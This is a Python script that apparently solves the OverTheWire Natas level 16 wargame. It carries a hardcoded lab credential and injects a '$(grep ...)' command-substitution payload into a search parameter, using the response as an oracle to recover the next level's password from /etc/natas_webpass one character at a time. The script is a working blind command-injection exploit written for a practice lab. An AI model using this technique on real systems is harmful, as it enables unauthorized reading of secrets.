import requests
import string

headers = {"Authorization": "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw=="}
url = "http://natas16.natas.labs.overthewire.org"

valid_chars = ""
chars = string.digits + string.ascii_letters

for c in chars:        
    payload = "$(grep " + c + " /etc/natas_webpass/natas17)zigzag"
    response = requests.get(url + "?needle=" +  payload + "&submit=Search", data=payload, headers=headers, verify=False) 

    if "zigzag" not in response.text:
        valid_chars += c
        print("[+] Found char: " + c) 

print("[+] Valid chars: " + valid_chars)

length = 32
password = ""

for i in range(length):
    for c in valid_chars:
        payload = "$(grep " + password + c + " /etc/natas_webpass/natas17)zigzag"
        response = requests.get(url + "?needle=" +  payload + "&submit=Search", data=payload, headers=headers, verify=False) 

        if "zigzag" not in response.text:
            password += c
            print("[+] Found char: " + c + " Password: " + password) 

print("[+] Second part: " + password)

while len(password) < length:
    for c in valid_chars:
        payload = "$(grep " + c + password + " /etc/natas_webpass/natas17)zigzag"
        response = requests.get(url + "?needle=" +  payload + "&submit=Search", data=payload, headers=headers, verify=False) 

        if "zigzag" not in response.text:
            password = c + password
            print("[+] Found char: " + c + " Password: " + password) 

print("[+} Full password: " + password)

print("[+] Done!")
